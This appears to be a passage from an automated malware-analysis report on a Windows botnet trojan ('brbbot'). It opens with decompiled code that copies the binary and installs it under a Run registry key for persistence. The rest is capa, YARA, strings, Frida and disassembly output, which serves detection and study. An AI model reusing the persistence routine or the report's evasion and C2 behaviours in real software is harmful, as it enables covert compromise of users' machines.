            } while (cVar1 != '\0');
            uVar10 = 0xffffffffffffffff;
            pcVar12 = acStack_248;
            do {
                if (uVar10 == 0) break;
                uVar10 = uVar10 - 1;
                cVar1 = *pcVar12;
                pcVar12 = pcVar12 + 1;
            } while (cVar1 != '\0');
            uVar5 = (*kernel32.GetProcessHeap)();
            piVar8 = (*kernel32.HeapAlloc)(uVar5, 8, ~uVar9 + 2 + ~uVar10);
            if (piVar8 == 0x0) {
                uVar4 = 0x8007000e;
            }
            else {
                uVar9 = 0xffffffffffffffff;
                pcVar12 = acStack_248;
                do {
                    if (uVar9 == 0) break;
                    uVar9 = uVar9 - 1;
                    cVar1 = *pcVar12;
                    pcVar12 = pcVar12 + 1;
                } while (cVar1 != '\0');
                strncpy(piVar8, acStack_248, ~uVar9 - 1);
                uVar9 = 0xffffffffffffffff;
                pcVar12 = pcVar6;
                do {
                    if (uVar9 == 0) break;
                    uVar9 = uVar9 - 1;
                    cVar1 = *pcVar12;
                    pcVar12 = pcVar12 + 1;
                } while (cVar1 != '\0');
                strncat(piVar8, pcVar6, ~uVar9 - 1);
                iVar3 = (*kernel32.CopyFileA)(&uStack_138, piVar8, 0);
                if ((iVar3 != 0) || (iVar7 != 0)) {
                    piStack_268 = aiStack_258;
                    bVar2 = true;
                    uVar4 = (*advapi32.RegOpenKeyExA)(0xffffffff80000002, &autorun, 0, 0x20006);
                    if (uVar4 == 0) {
                        iVar11 = -1;
                        piVar13 = piVar8;
                        do {
                            if (iVar11 == 0) break;
                            iVar11 = iVar11 + -1;
                            cVar1 = *piVar13;
                            piVar13 = piVar13 + 1;
                        } while (cVar1 != '\0');
                        uStack_260 = ~iVar11;
                        piStack_268 = piVar8;
                        uVar4 = (*advapi32.RegSetValueExA)(aiStack_258[0], "brbbot", 0, 1);
                        if (uVar4 == 0) {
                            (*advapi32.RegFlushKey)(aiStack_258[0]);
                            if (iVar7 == 0) {
                                (*kernel32.MoveFileExA)(&uStack_138, 0, 4);
                            }
                  
```

### Virtual Files (1)
| Path / Name | Unpacked Size | Type |
|---|---|---|
| CONFIG/101/en-us | 73 | - |

### Structures (25)
| Name | EA |
|---|---|
| MZ | 0 |
| RichHeader | 128 |
| PE | 232 |
| OptionalHeader | 256 |
| Sections | 496 |
| advapi32.FT | 54272 |
| kernel32.FT | 54392 |
| user32.FT | 55088 |
| wininet.FT | 55104 |
| ws2_32.FT | 55184 |
| ImportTable | 65556 |
| advapi32.OFT | 65680 |
| kernel32.OFT | 65800 |
| user32.OFT | 66496 |
| wininet.OFT | 66512 |
| ws2_32.OFT | 66592 |
| ImportNames | 66640 |
| ExceptionTable | 87040 |
| Resources | 91136 |
| Resources.CONFIG | 91160 |
| Resources.CONFIG.101 | 91184 |
| Resources.CONFIG.101.en-us | 91208 |
| ResourceName | 91224 |
| Resources.CONFIG.101.en-us.Data | 91248 |
| Relocations | 95232 |


## capa Capability Rules
engine: `malcat-capa` · Total rules: 35 · duration_s: 1.13

| Rule | ATT&CK | MBC |
|---|---|---|
| encode data using XOR | T1027:Obfuscated Files or Information | E1027.m02:Obfuscated Files or Information, C0026.002:Encode Data |
| encrypt or decrypt via WinCrypt | T1027:Obfuscated Files or Information | C0031:Decrypt Data, C0027:Encrypt Data |
| encrypt data using RC4 via WinAPI | T1027:Obfuscated Files or Information | E1027.m05:Obfuscated Files or Information, C0027.009:Encrypt Data |
| create new key via CryptAcquireContext | T1027:Obfuscated Files or Information | C0028:Encryption Key |
| query environment variable | T1082:System Information Discovery | E1082:System Information Discovery |
| get common file path | T1083:File and Directory Discovery | E1083:File and Directory Discovery |
| get file size | T1083:File and Directory Discovery | E1083:File and Directory Discovery |
| get hostname | T1082:System Information Discovery | E1082:System Information Discovery |
| delete registry value | T1112:Modify Registry | C0036.007:Registry |
| persist via Run registry key | T1547.001:Boot or Logon Autostart Execution | F0012:Registry Run Keys / Startup Folder |
| receive data |  | B0030.002:C2 Communication |
| send data |  | B0030.001:C2 Communication |
| write and execute a file |  | B0023:Install Additional Program |
| resolve DNS |  | C0011.001:DNS Communication |
| check HTTP status code |  | C0002.014:HTTP Communication |

## PE Imports / Signals
import_count: 115

| label | api_match | ATT&CK |
|---|---|---|
| check_debugger | IsDebuggerPresent | T1622 |
| crypto_encrypt | CryptEncrypt | T1573 |
| http_client | InternetOpen | T1071.001 |
| set_registry_value | RegSetValue | T1112 |
| create_process | CreateProcess | T1106 |
| load_library | LoadLibrary | T1129 |
| get_proc_address | GetProcAddress | T1129 |

## YARA Matches (pipeline)
Total matches: 17

| Rule | Namespace | Match strings (trimmed) |
|---|---|---|
| domain | - | $domain_regex@0 len=2 |
| contains_base64 | - | $a@4117 len=12 |
| Dropper_Strings | - | $a0@59035 len=18 |
| Advapi_Hash_API | - | $advapi32@63816 len=12; $CryptCreateHash@63730 len=15; $CryptHashData@63802 len=13; $CryptAcquireContext@63650 len=19 |
| IsPE64 | - |  |
| IsWindowsGUI | - |  |
| HasRichSignature | - | $a0@208 len=4 |
| Microsoft_Visual_Cpp_80_DLL | - | $b@13204 len=4 |
| anti_dbg | - | $d1@64588 len=12; $c2@64758 len=17 |
| network_http | - | $f1@64018 len=11; $c1@63922 len=15; $c2@64004 len=12; $c4@63862 len=16; $c6@63964 len=15; $c7@63984 len=15 |
| screenshot | - | $d2@64610 len=10; $c2@64604 len=5 |
| win_registry | - | $f1@63816 len=12; $c2@63588 len=13; $c3@63636 len=11; $c4@63570 len=14; $c6@63636 len=11 |
| win_files_operation | - | $f1@64588 len=12; $c1@64132 len=9; $c2@65400 len=14; $c3@64132 len=9; $c4@63870 len=8; $c5@64474 len=11; $c6@64044 len=11 |
| Str_Win32_Winsock2_Library | - | $ws2_lib@64030 len=10 |
| Str_Win32_Wininet_Library | - | $wininet_lib@64018 len=11 |
| Str_Win32_Internet_API | - | $wininet_call_closeh@63882 len=19; $wininet_call_readf@63862 len=16; $wininet_call_connect@63922 len=15; $wininet_call_open@64004 len=12 |
| Str_Win32_Http_API | - | $wininet_call_httpr@63984 len=15; $wininet_call_httpq@63904 len=13; $wininet_call_httpo@63964 len=15 |

## Generated YARA Meta
```json
{
  "sha256": "f47060d0f7de5ee651878eb18dd2d24b5003bdb03ef4f49879f448f05034a21e",
  "family": "trojan.blocker/bckn (botnet trojan)",
  "imphash": "475b069fec5e5868caeb7d4d89236c89",
  "generated_at": "2026-08-12T16:45:56.141645+00:00",
  "string_count": 24,
  "strings": [
    "!This program cannot be run in DOS mode.",
    "UVATAVAWH",
    "\\$ D9d$x",
    "0A_A^A\\^]",
    "\\$ UVWATAUAVAWH",
    "A_A^A]A\\_^]",
    "UVWATAUAVAWH",
    "\\$ UVATAUAWH",
    "A_A]A\\^]",
    "D8D$0u9D",
    "D$<D9D$`t",
    "t$\\D9D$`t",
    "t$\\D8D$@t",
    "t$4D8D$8t",
    "|$ UATAUAVAWH",
    "A_A^A]A\\]",
    "D$DD9T$\\",
    "t$hD+d$DD+",
    "UVWATAUH",
    "D$&8\\$&t-8X",
    "@A]A\\_^]",
    "WATAUAVAWH",
    "@A_A^A]A\\_",
    "t$ WATAUH"
  ],
  "rule_path": "/opt/samples/logs/f47060d0f7de5ee651878eb18dd2d24b5003bdb03ef4f49879f448f05034a21e/rule.yar",
  "sigma_path": "/opt/samples/logs/f47060d0f7de5ee651878eb18dd2d24b5003bdb03ef4f49879f448f05034a21e/rule.yml",
  "iocs_path": "/opt/samples/logs/f47060d0f7de5ee651878eb18dd2d24b5003bdb03ef4f49879f448f05034a21e/iocs.json",
  "yara_valid": true,
  "yara_check": "ok",
  "goodware_fp": {
    "goodware_dir": "/opt/samples/goodware",
    "fp_count": 0,
    "fp_samples": [],
    "skipped": "goodware corpus not staged"
  },
  "yargen": {
    "skipped": true
  },
  "revai": true,
  "provenance": {
    "project": "RevAI",
    "commit": "unknown",
    "engine": "langgraph",
    "flags": {
      "budget_warnings": true,
      "redundant_nudge": true,
      "hallucination_check": true,
      "failure_taxonomy": true
    },
    "utc": "2026-08-12 16:45:56 UTC"
  },
  "publish_target": "revai_publish"
}
```

## FLOSS Strings
Total strings: 310 · per_category: `{"decoded_strings": 0, "stack_strings": 0, "tight_strings": 0, "language_strings": 0, "language_strings_missed": 0, "static_strings": 310}`

### FLOSS sample
- `!This program cannot be run in DOS mode.`
- ``.rdata`
- `@.data`
- `.pdata`
- `@.rsrc`
- `@.reloc`
- `WATAUH`
- `USVATH`
- `xA\^[]`
- `UVATAVAWH`
- `\$ D9d$x`
- `0A_A^A\^]`
- `\$ UVWATAUAVAWH`
- `A_A^A]A\_^]`
- `UVWATAUAVAWH`
- `|$ H9=`
- `@SATAUH`
- `@A]A\[`
- `\$ UVATAUAWH`
- `D9&t3H`
- `A_A]A\^]`
- `L$ USWH`
- `D8D$0u9D`
- `D9D$`t`
- `D$<D9D$`t`
- `D)\$4A;`
- `t$\D9D$`t`
- `t$\D8D$@t`
- `D8D$0u`
- `t$4D8D$8t`
- `|$ UATAUAVAWH`
- `A_A^A]A\]`
- `D$DD9T$\`
- `t$hD+d$DD+`
- `9D$Pti`
- `UVWATAUH`
- `D$&8\$&t-8X`
- `@A]A\_^]`
- `WATAUAVAWH`
- `@A_A^A]A\_`

## .NET Analysis
- is_dotnet: false (not observed)

## radare2 Disassembly (attach in Static Code Analysis)
### 0x140003f94
```asm
┌ 401: entry0 ();
│       ╎   ; var int64_t var_20h @ rsp+0x20
│       ╎   ; var int64_t var_30h @ rsp+0x30
│       ╎   ; var int64_t var_6ch @ rsp+0x6c
│       ╎   ; var int64_t var_70h @ rsp+0x70
│       ╎   ; var int64_t var_b0h @ rsp+0xb0
│       ╎   ; var int64_t var_10h @ rsp+0xb8
│       ╎   0x140003f94      4883ec28       sub rsp, 0x28
│       ╎   0x140003f98      e8f7490000     call 0x140008994
│       ╎   0x140003f9d      4883c428       add rsp, 0x28
│       └─< 0x140003fa1      e952feffff     jmp 0x140003df8
..
```

## UPX Unpack
- upx_ok: False
- is_packed: False
- returncode: None
- unpacked_path: ``

## XOR Search
- Found XOR 00 position 00000000: 000000E8 ........!..L.!This program cannot be r

## Speakeasy (dynamic)
- speakeasy_ok: True
- api_calls: 0
- key_events: 0
- duration_s: None
- **not observed**: no API calls/events recorded — do not invent runtime behavior

## Frida Probe
- frida_available: True
- version: 17.16.4
- hook_candidates:
  - `ADVAPI32.dll!RegSetValueExA`
  - `ADVAPI32.dll!RegOpenKeyExA`
  - `ADVAPI32.dll!RegDeleteValueA`
  - `ADVAPI32.dll!RegFlushKey`
  - `ADVAPI32.dll!RegCloseKey`
  - `WININET.dll!HttpSendRequestA`
  - `WININET.dll!InternetQueryDataAvailable`
  - `WININET.dll!InternetReadFile`
  - `WININET.dll!InternetCloseHandle`
  - `WININET.dll!HttpQueryInfoA`
  - `WS2_32.dll!gethostbyname`
  - `WS2_32.dll!WSACleanup`
  - `WS2_32.dll!WSAStartup`
  - `WS2_32.dll!inet_ntoa`
  - `WS2_32.dll!gethostname`
  - `KERNEL32.dll!CreateFileW`
  - `KERNEL32.dll!HeapSize`
  - `KERNEL32.dll!WriteConsoleW`
  - `KERNEL32.dll!SetStdHandle`
  - `KERNEL32.dll!LoadLibraryW`
  - `USER32.dll!GetDC`

## Audit Trail (recent)
- `{"source": "ghidra_query", "sql": "SELECT start_addr, end_addr, name FROM memory_blocks", "ts": 1786591342.805329}`
- `{"source": "ghidra_query", "sql": "SELECT addr, mnemonic, operands FROM instructions WHERE operands LIKE '%FS:%' OR operands LIKE '%GS:%'", "ts": 1786591344.5243034}`
- `{"source": "ghidra_query", "sql": "SELECT src_func_addr, src_func_name, dst_func_name FROM callgraph_edges WHERE dst_func_name LIKE 'IsDebuggerPresent%' OR dst_func_name LIKE 'CheckRemoteDebuggerPresent%' OR dst_func_name LIKE 'NtQueryInformationProcess%' OR dst_func_name LIKE 'OutputDebugString%' O`
- `{"source": "ghidra_query", "sql": "SELECT src_func_addr, src_func_name, dst_func_name FROM callgraph_edges WHERE dst_func_name LIKE 'SetUnhandledExceptionFilter%' OR dst_func_name LIKE 'UnhandledExceptionFilter%'", "ts": 1786591968.2533274}`
- `{"source": "ghidra_query", "sql": "SELECT addr AS address, name, size FROM funcs", "ts": 1786592708.8209445}`
- `{"source": "ghidra_query", "sql": "SELECT start_addr, end_addr, name FROM memory_blocks", "ts": 1786592709.323452}`
- `{"source": "ghidra_query", "sql": "SELECT addr, mnemonic, operands FROM instructions WHERE operands LIKE '%FS:%' OR operands LIKE '%GS:%'", "ts": 1786592711.0692625}`
- `{"source": "ghidra_query", "sql": "SELECT addr AS address, name, size FROM funcs", "ts": 1786593008.8618004}`
- `{"source": "ghidra_query", "sql": "SELECT addr AS address, name, size FROM funcs", "ts": 1786593330.5503616}`
- `{"source": "ghidra_query", "sql": "SELECT start_addr, end_addr, name FROM memory_blocks", "ts": 1786593331.0572257}`
- `{"source": "ghidra_query", "sql": "SELECT addr, mnemonic, operands FROM instructions WHERE operands LIKE '%FS:%' OR operands LIKE '%GS:%'", "ts": 1786593332.8885026}`
- `{"source": "ghidra_query", "sql": "SELECT addr AS address, name, size FROM funcs", "ts": 1786593668.8132927}`
- `{"source": "ghidra_query", "sql": "SELECT start_addr, end_addr, name FROM memory_blocks", "ts": 1786593669.315364}`
- `{"source": "ghidra_query", "sql": "SELECT addr, mnemonic, operands FROM instructions WHERE operands LIKE '%FS:%' OR operands LIKE '%GS:%'", "ts": 1786593671.131205}`
- `{"source": "ghidra_query", "sql": "SELECT addr, name FROM names", "ts": 1786593671.6493819}`
- `{"source": "ghidra_query", "sql": "SELECT src_func_addr, dst_func_addr FROM call_edges", "ts": 1786593672.2994828}`
- `{"source": "ghidra_query", "sql": "SELECT addr, content FROM strings WHERE length < 300", "ts": 1786593672.8342702}`
- `{"source": "ghidra_query", "sql": "SELECT addr AS address, name, size FROM funcs", "ts": 1786593673.387504}`
- `{"source": "ghidra_query", "sql": "SELECT addr, name FROM names", "ts": 1786593673.8873715}`
- `{"source": "ghidra_query", "sql": "SELECT src_func_addr, dst_func_addr FROM call_edges", "ts": 1786593674.4893465}`
- `{"source": "ghidra_query", "sql": "SELECT src_func_addr, dst_func_addr FROM call_edges", "ts": 1786593675.0890138}`
- `{"source": "ghidra_query", "sql": "SELECT addr, mnemonic, operands FROM instructions WHERE operands LIKE '%FS:%' OR operands LIKE '%GS:%'", "ts": 1786593676.8153198}`
- `{"source": "ghidra_query", "sql": "SELECT name, module FROM imports WHERE name LIKE 'Ordinal%'", "ts": 1786593677.3137572}`
- `{"source": "ida_query", "sql": "SELECT COUNT(*) AS n FROM funcs", "ts": 1786594740.3336983}`
- `{"source": "ida_query", "sql": "SELECT name, addr FROM funcs ORDER BY addr LIMIT 3", "ts": 1786594740.3355467}`
- `{"source": "ida_query", "sql": "SELECT name, addr, size FROM funcs ORDER BY size DESC LIMIT 3", "ts": 1786595050.3260322}`
- `{"source": "ida_query", "sql": "SELECT content, printf(\"0x%X\", addr) AS addr FROM strings WHERE content LIKE \"%http%\" LIMIT 3", "ts": 1786595050.3279548}`
- `{"source": "ida_query", "sql": "SELECT module, name, addr FROM imports LIMIT 3", "ts": 1786595050.330157}`
- `{"source": "ida_query", "sql": "SELECT start_addr, end_addr, name FROM segments LIMIT 3", "ts": 1786595050.3317134}`
- `{"source": "ida_query", "sql": "SELECT from_addr, to_addr, is_code FROM xrefs LIMIT 2", "ts": 1786595050.3346186}`
